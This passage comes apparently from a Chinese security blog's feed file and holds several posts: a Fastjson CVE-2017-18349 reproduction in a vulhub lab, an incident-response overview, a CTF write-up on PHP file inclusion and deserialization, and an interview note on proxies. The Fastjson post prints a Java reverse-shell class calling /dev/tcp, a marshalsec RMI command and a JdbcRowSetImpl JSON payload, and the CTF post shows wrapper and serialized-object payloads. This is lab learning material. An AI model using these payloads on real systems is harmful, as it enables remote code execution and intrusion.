的基础上提高精度（减少误报率）和速度。</p><hr><p><font color="red">0x03 如何理解 abstraction（抽象） 和 over-approximation（近似）？</font></p><p>抽象和近似，是静态分析中常用的两种技术手段。</p><ul><li>抽象：对情景进行提炼和总结，抽象出关键词（0、1、unknown、undefined）。</li><li>近似：利用转换函数（可以进行分类的函数）、分析控制流来将代码中的要素归类到前面抽象的关键词中。</li></ul><hr><p>参考文章：</p><ol><li><a href="http://www.jos.org.cn/html/2019/1/5651.htm#outline_anchor_11">程序分析研究进展</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 污点分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】CVE-2017-18349：Fastjson 任意代码执行</title>
      <link href="f8dd72d9678b/"/>
      <url>f8dd72d9678b/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>Fastjson 是一个阿里巴巴的开源 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><h1 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h1><p><strong>编号：CVE-2017-18349</strong></p><p>Fastjson 提供了 autotype 功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson 自定义的反序列化机制时会调用指定类中的 setter 方法及部分 getter 方法，那么当组件开启了 autotype 功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定 setter 或者 getter 方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启 autotype 功能的绕过。</p><h1 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h1><p>Fastjson1.2.47以及之前的所有版本</p><h1 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h1><ol><li><p>启动环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载 vulhub</span></span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">cd vulhub/fastjson/1.2.47-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li><li><p>判断是否正常启动。访问<code>http://127.0.0.1:8090</code>，会返回一个 Json 串，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210304172714.png"></p></li></ol><h1 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h1><blockquote><p>主机IP：172.18.0.1</p><p>靶机IP：172.18.0.2</p></blockquote><ol><li><font color="red">编译反弹 shell 恶意代码</font><blockquote><p>注意⚠️：将本地的 JDK 切换到 <code>openjdk:8u102</code></p></blockquote></li></ol><p>创建恶意代码 <code>Exploit.java</code> 文件，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Runtime</span><br><span class="line">        .getRuntime()</span><br><span class="line">        .exec(</span><br><span class="line">          <span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/172.18.0.1/9876 0&gt;&amp;1&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">    Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>javac Exploit.java</code> 进行编译。(记得修改上面的为自己的主机 ip 地址)</p><ol start="2"><li><font color="red">搭建 Web 服务，让<strong>目标靶机</strong>可以访问。</font></li></ol><p>在 class 路径下执行 <code>python3 -m http.server 8081</code> 即可。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305130108.png"></p><ol start="3"><li><font color="red">使用 marshalsec 搭建 RMI（Remote Method Invoke）环境.在 java 反序列化时，利用序列化数据造成代码执行攻击。</font></li></ol><p>先编译 marshalsec</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec </span><br><span class="line">mvn clean package -DskipTests <span class="comment"># 使用 maven 编译</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译后进入 <code>target</code> 目录，并使用下面的命令启动 RMI 服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://172.18.0.1:8081/#Exploit&quot;</span> 9999</span><br></pre></td></tr></table></figure><blockquote><p>这里的 URL <code>http://172.18.0.1:8081/#Exploit</code> 有几个关键的要素：</p><ol><li>目标靶机可以访问到 IP 地址（我的主机地址为 <code>172.18.0.1</code>，我的靶机地址为 <code>172.18.0.2</code>，在同一个内网中）。除非 Fastjson 搭建在本地环境，否则不要使用 <code>127.0.0.1</code></li><li>Web 服务下载 Exploit.class 的 URL 为 <code>http://172.18.0.1:8081/Exploit.class</code>，在命令行中需要改写为 <code>http://172.18.0.1:8081/#Exploit</code></li></ol></blockquote><ol start="4"><li><font color="red">使用 Burpsuite 修改 GET 为 POST，并发送 exp。</font></li></ol><p>exp:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://172.18.0.1:9999/Exploit&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Burpsuite具体配置如下：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133216.png"></p><p>在 VPS 中使用命令 <code>nc -lvp 9876</code> 来接收反弹的 shell，然后在 Burp 发送数据包，发送后能观察到 RMI 服务和 Web 服务都被靶机访问。（说明发送过程没问题，如果没有看到下面的结果，需要检查一下 IP 和端口设置）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305133353.png"></p><p>成功 GET shell<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305134426.png"></p><p>整体流程图：</p><h1 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h1><p>我复现完整个流程后，其实是非常懵逼的，这些教程为什么写到这里就结束了，难道他们都会吗？我是太菜了吗？原理是什么？怎么都没讲清楚？</p><h2 id="1-Fastjson怎么使用？"><a href="#1-Fastjson怎么使用？" class="headerlink" title="1 Fastjson怎么使用？"></a>1 Fastjson怎么使用？</h2><h1 id="0x07-修复方式"><a href="#0x07-修复方式" class="headerlink" title="0x07 修复方式"></a>0x07 修复方式</h1><h1 id="0x08-坑"><a href="#0x08-坑" class="headerlink" title="0x08 坑"></a>0x08 坑</h1><ol><li></li><li>编译恶意代码时，需要 Java 8。</li></ol><p>参考教程：</p><ol><li><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">fastjson反序列化漏洞复现</a></li><li></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】浅谈应急响应</title>
      <link href="d9a63af06d5a/"/>
      <url>d9a63af06d5a/</url>
      
        <content type="html"><![CDATA[<p>应急响应包含组织为了应对突发/重大信息安全事件的发生所做的准备，以及在事件发生后所采取的措施。，是信息安全从业者的常见工作之一。应急响应并非仅仅是在系统被黑之后做一系列的补救措施，而是需要在平时就进行被黑的准备和避免被黑。</p><p>各大厂商通常的做法就是成立应急响应中心 SRC（Security Response Center），来尽量避免被黑。</p><hr><h1 id="1-Why？"><a href="#1-Why？" class="headerlink" title="1 Why？"></a>1 Why？</h1><p><font color="red">问1:为什么需要应急响应流程？</font></p><p>需要了解为什么需要应急响应，那就需要从应急响应的目的入手：尽可能保证网站系统的安全。</p><p>如果网站厂商不具备网站基本的保护能力，即基本的入侵检测能力，平时检测不到入侵事件，有可能被入侵成功很久了却浑然不知，攻击者可能早就在达成目标后，清理痕迹悄然离去了，然后就被爆出新闻《xxx公司xx万个人隐私信息流入暗网售卖》，紧接着股票下跌，一系列指责……</p><p>（开发人员的重心都处在开发任务，他们的任务是开发新功能并保证系统的正常运行，并不保障是否安全。）</p><p>如果具备应急响应能力，平时可以对流量进行监控，对异常流量及时拦截，溯源分析流量来源，将心怀不轨之人绳之以法。</p><p>原因便浮出水面：尽可能保证网站系统的安全，减少公司因恶意攻击而收到的损失。</p><p><font color="red">问2:为什么需要应急响应中心（SRC）？</font></p><p>大型企业涉及的产品众多，攻击面广，漏洞被外部发现难以避免。如果被无意或善意的人发现了，应该如何接收这些漏洞呢？</p><p>（这让我想到了漏洞贩卖，据说 0 day 的买卖是合法交易，不卖留着砸手里？狗头</p><p>互联网工作组的“<a href="https://tools.ietf.org/html/draft-christey-wysopal-vuln-disclosure-00">负责任的漏洞披露过程</a>”是一个广泛被业界采纳的做法。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210303045932.png"></p><p>具体做法被分为两种模式：</p><ol><li>微软模式：公告。也有赏金计划。</li><li>谷歌模式：公告+赏金。</li></ol><p>腾讯：送公仔-&gt;排行榜-&gt;兑换。</p><p>也就是说安全应急响应中心是对自己安全团队所做的安全保障工作的补充，减小入侵事件发生的概率。</p><h1 id="2-What？"><a href="#2-What？" class="headerlink" title="2 What？"></a>2 What？</h1><p><font color="red">问1:应急响应需要做什么？</font></p><p>应急响应有一个被广泛接受的方法论（也就是最佳实践）——PDCERF 模型，这个模型提供了应急响应的大体思路。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210303031941.png"></p><ol><li>准备阶段：将 PDCERF 中可能会使用到的工具、知识、技能进行提前准备，为后面的流程节约时间。</li><li>检测阶段：目的是确认入侵事件是否发生。常见的漏洞通过分析日志即可，而病毒需要进行进一步的分析。病毒本身必然有网络行为，内存必然有其二进制代码，它要么是单独的进程模块，要么是进程的dll/so模块，通常，为了保活，它极可能还有自己的启动项、网络心跳包。</li><li>遏制阶段：目的是控制事件影响范围，避免黑客在内网中进一步扩大攻击面。</li><li>根除阶段：目的是避免黑客再度侵入。</li><li>恢复阶段：目的是恢复业务的连续性。</li><li>跟踪总结阶段:目的是思考安全事件的根本原因，优化安全策略.</li></ol><h1 id="3-How？"><a href="#3-How？" class="headerlink" title="3 How？"></a>3 How？</h1><p><font color="red">问1:需要做什么？</font></p><p>没有具体的实战经验，以后有实战经验之后再来补充吧。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/2021%E5%B9%B43%E6%9C%88-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.png"></p><p>参考文章：</p><ol><li><a href="https://zhuanlan.zhihu.com/p/43437121">应急响应浅谈</a></li><li><a href="https://security.tencent.com/index.php/blog/msg/84">企业安全应急响应中心建设理论与实践</a></li><li><a href="https://www.secrss.com/articles/7374">应急响应的整体思路和基本流程</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【CTF系列】攻防世界-nizhuansiwei</title>
      <link href="fb094f6e84fe/"/>
      <url>fb094f6e84fe/</url>
      
        <content type="html"><![CDATA[<p>相关信息:</p><blockquote><p>hint：无</p></blockquote><p>进入网站后，便能显示源码，是一道代码审计题目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="comment">// text 需要等于 welcome</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 文件名中不能包含 flag</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 可能需要读取 useless.php</span></span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line"><span class="comment">// php 反序列化</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我在源码中写了一些关键信息。</p><p>我还收集了一些其他信息</p><blockquote><ul><li>服务器信息</li><li>网站路径（有些题目不扫路径确实做不出来）</li></ul></blockquote><p>网站使用 PHP 和 Apache 搭建，并没有 Cookie。Web 路径如下：</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302122549.png"></p><p>（图片说明：访问 flag.php 并没有 flag）</p><hr><h1 id="1-file-get-content"><a href="#1-file-get-content" class="headerlink" title="1 file_get_content"></a>1 file_get_content</h1><p>第一步，我们需要将变量 text 赋值为 <code>welcome to the zjctf</code>，我们需要使用到 file_get_content 读取网页的功能<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302133315.png"></p><p>首先尝试 data 协议，如果 data 协议可以实现，那么 php://input 也应该可以实现。</p><blockquote><p>构造后的 URL：<a href="http://111.200.241.244:45370/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=">http://111.200.241.244:45370/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</a><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302133500.png"></p></blockquote><p>再尝试使用 php://input 实现</p><blockquote><p>PS: Hackbar 发送 POST 必须要含等号，否则无数据。（满满都是心酸泪<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302133604.png"></p></blockquote><hr><h1 id="2-include"><a href="#2-include" class="headerlink" title="2 include"></a>2 include</h1><p>通过第一步的测试，我们可以正常一些配置信息如下：</p><blockquote><ol><li>allow_url_include:on</li><li>allow_url_fopen:on</li></ol></blockquote><p>第二步就是利用 include 尝试读取源码注释的文件名（useless.php）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302134719.png"></p><p>所以这里我们采用 php://filter 伪协议来读取。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302134942.png"></p><p>使用 base64 脚本解码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//读取文件流</span></span><br><span class="line">$fileData = file_get_contents(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"><span class="comment">//将文件写入本地</span></span><br><span class="line">file_put_contents(<span class="string">&quot;useless.php&quot;</span>, base64_decode($fileData));</span><br></pre></td></tr></table></figure><p>解码后的源码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-反序列化"><a href="#3-反序列化" class="headerlink" title="3 反序列化"></a>3 反序列化</h1><p>在 useless.php 中的注释，是在暗示 flag 位于 flag.php 文件中，我们将 file 改为 flag.php 即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将 file 改为 php，让 include 执行 useless.php，从而引入 Flag 类，最后访问即可得到 flag（代码在源码中）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302135514.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础2：正向代理和反向代理的区别是什么？</title>
      <link href="0724234561f0/"/>
      <url>0724234561f0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源：<a href="https://whale3070.github.io/interview/2020/05/19/11-x">https://whale3070.github.io/interview/2020/05/19/11-x</a></p></blockquote><p>正向代理是为了帮助客户端访问其无法访问（有阻碍，如 WAF 或者内网）的服务器资源而产生的技术，在程序员中被广泛使用。例如：科学上网、VPN。</p><p>反向代理是为了替服务器收发请求而产生的技术。由代理服务器接收消息，在把消息分给其他服务器（可能背后有几百台）。这样做有很多好处，比如：</p><ol><li>保护真实服务器的安全；</li><li>减少单台服务器的压力（负载均衡）；</li></ol><p>nginx 实现了 HTTP 请求的反向代理。</p><p>类似上一个题目，提出关键问题，并逐一解答</p><h1 id="1-Why？"><a href="#1-Why？" class="headerlink" title="1 Why？"></a>1 Why？</h1><p><font color="red">问1:为什么面试官要问这个问题？</font></p><p>考察对于网站架构及基本原理的熟悉程度。我虽然有一点网站开发的经验，但是没探究过这方面的原理，可以稍微补充一下。</p><blockquote><p>参考文章：<a href="https://www.cnblogs.com/cangqinglang/p/10766181.html">传送门</a>，推荐阅读一下，讲得非常通熟易懂。</p></blockquote><p><font color="orange">阶段1:单机构建网站</font></p><p>刚学习网站开发基本都是这样的单机结构，也就是将应用服务器、数据库全部放在一台机器上，能完成基本的网络服务。</p><p>常见的应用服务器：</p><ul><li>Apache</li><li>Tomcat</li><li>Nginx</li><li>Jetty<blockquote><p>应用服务器又叫做 HTTP 服务器。本质上也是一种应用程序，通常运行在服务器之上，绑定服务器的 IP 地址并监听某一个 TCP 端口来接收并处理 HTTP 请求。</p></blockquote></li></ul><p>特点：把数据库和应用程序都在一台服务器中，用户较少，数据量较少。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302185013.png"></p><p>（图片说明：应用服务器和数据库处于单台机器）</p><p><font color="orange">阶段1:应用服务器与数据库分离</font></p><p>随着用户量的增大，为了减小单台服务器的压力，将数据的增删查改迁移到另一台服务器。</p><blockquote><p>为什么先应用服务器和数据库分离呢？</p><ul><li>简单：数据库和应用服务器之间通常都是通过地址的形式进行通信的，迁移数据库不需要很大的工作量（不用改太多的代码）。</li></ul></blockquote><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302185026.png"></p><p>（图片说明：应用服务器和数据库处于不同的机器）</p><p><font color="orange">阶段3:应用服务器集群</font></p><p>随着用户量的增大，假设数据库的读写服务器没有压力，而应用服务器的运算存在压力，那么要就考虑采用多台应用服务器来分担压力。这就需要一个管理人员，来给服务器分摊工作量。</p><p>常见的 nginx 高可用集群：Keepalived、LVS、nginx。</p><p>你可能会想，只用 nginx 分发应该就可以了吧？</p><blockquote><ul><li>如果只用 nginx，服务器宕机怎么办？解决方案：Keepalived 监控服务器状态。</li><li>如果只使用一台 nginx 分发，万一 nginx 也不够咋办？LVS 从传输层对数据包进行分发，分发给不同的 nginx。</li></ul></blockquote><p>参考文章：<a href="https://my.oschina.net/zhangxufeng/blog/3081423">传送门</a></p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210302191858.png"></p><p>（图片说明：应用服务器增加，并添加负载均衡服务器来进行调度）</p><p><font color="orange">阶段4:数据库读写分离化</font></p><p>在上一个阶段解决了应用服务器的压力问题，那么随着流量的增大，数据库是最有可能出现瓶颈的地方。</p><p>数据库的读取和写入是两个相互不相关的功能，应该可以放在不同的服务器上实现吧？那怎么实现呢？主从复制，如下图所示。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210303224726.png"></p><p>（图片说明：数据库被分为主库和从库，主库写入，从库读取，主库和从库的数据使用工具保持同步）</p><p>从库不一定只有一台服务器，可以部署多台从服务器，和主服务器进行同步。这样就可以承担更大负荷的读取操作。</p><p>常见的解决方案：</p><ol><li>MySQL 自带的主从复制</li><li>MyCat 中间件<blockquote><p>这种中间件漏洞没搜到漏洞……</p></blockquote></li></ol><ul><li><font color="orange">阶段5:用搜索引擎缓解读库的压力</font></li><li><font color="orange">阶段6:用缓存缓解读库的压力</font></li><li><font color="orange">阶段7:数据库水平拆分与垂直拆分（数据过多）</font></li><li><font color="orange">阶段8:将应用按微服务拆分</font></li></ul><p>（注：后面的阶段都更偏向于性能拓展，需要时再学习）</p><p><font color="red">问2:学习网络安全为什么要学这个？</font></p><p>熟悉 Web 的结构，能帮助理解网站的全貌，更容易理解漏洞。</p><h1 id="2-What？"><a href="#2-What？" class="headerlink" title="2 What？"></a>2 What？</h1><p><font color="red">问1:这个问题的答案是什么？</font></p><p>正向代理和反向代理的根本区别：代理对象不同。正向代理为客户端服务，也就是客户端控制代理服务器的行为，客户端控制代理服务器访问另一个网段的不同服务器（为客户端服务）。反向代理为服务器服务，也就是服务器控制代理服务器的行为，服务器的负荷情况控制代理服务器将请求发送到不同的服务器（为服务器服务）。如下图所示。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a3eb881b758a44e6a554a59489d30b83.png"></p><p>（图片说明：Proxy 也需要与多个 Server 连接，所以关键还是看为谁而服务）</p><p><font color="red">问2:还有什么类似的题目？</font><br>暂时无</p><h1 id="花絮"><a href="#花絮" class="headerlink" title="花絮"></a>花絮</h1><p>本来第 2 个面试题是想写：工作组和域的区别是什么？</p><blockquote><p>题目来源：<a href="https://whale3070.github.io/interview/2020/05/19/11-x">https://whale3070.github.io/interview/2020/05/19/11-x</a></p></blockquote><p>但是我仔细思考了下面的几个问题，重新选择了现在的问题。我并不是为了面试而面试，我整理面试题是为了帮助自己理清发展方向上的基本概念。</p><blockquote><p>目前自己的能力栈偏向于开发，不过我相信 <code>时间可以让平凡的事情，变得不平凡。——削微寒</code>。</p></blockquote><p><font color="red">问1:我期望的发展方向是什么？</font></p><ol><li>进击国际 CTF 竞赛，认识大佬。</li><li>挖掘漏洞（Web/PWN），为安全作出自己的绵薄之力。<blockquote><p>Be patient.</p></blockquote></li></ol><p><font color="red">问2:这个问题在问什么？</font></p><p>这个问题在问内网安全相关的基础知识。</p><p><font color="red">问3:这个问题符合我自己的发展方向吗？</font></p><p>不符合，几乎不会用到，用到了再学。</p><blockquote><p>PS：不符合就不学了吗？<br>根据我在另一篇文章<a href="https://slug01sh.github.io/2021/02/27/2021%E5%B9%B42%E6%9C%8827%E6%97%A5-%E3%80%90CTF%E7%B3%BB%E5%88%97%E3%80%91%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%8E%AF%E5%A2%83/">【CTF系列】常见Web漏洞原理以及搭建简单环境-深度和广度之辩</a>中提到的原则，我选择不学。</p></blockquote><hr><p>有点乱……。不过面试题的答案还是梳理得非常清楚的，下次多关注一下问题本身。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正向代理 </tag>
            
            <tag> 反向代理 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF系列】深度和广度之辨</title>
      <link href="30d0eafedca3/"/>
      <url>30d0eafedca3/</url>
      
